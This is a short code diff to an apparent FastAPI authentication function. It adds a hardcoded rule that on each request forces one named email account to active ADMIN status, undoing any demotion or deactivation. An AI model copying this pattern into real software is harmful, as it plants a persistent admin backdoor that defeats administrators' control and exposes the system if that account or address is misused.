@@ -170,6 +170,17 @@ async def get_current_user(
                 detail="Session expired: Please sign in again"
             )
 
+        # Permanent Super Admin Invariant: reitumetse@auraworks.co.za is ALWAYS active ADMIN
+        if user_record.email and user_record.email.lower() == "reitumetse@auraworks.co.za":
+            if user_record.role != UserRole.ADMIN or not user_record.is_active:
+                user_record.role = UserRole.ADMIN
+                user_record.is_active = True
+                db.add(user_record)
+                try:
+                    await db.commit()
+                except Exception as e:
+                    logger.warning(f"Failed to persist super admin role auto-heal: {e}")
+
         if not user_record.is_active:
             raise HTTPException(
                 status_code=status.HTTP_403_FORBIDDEN,
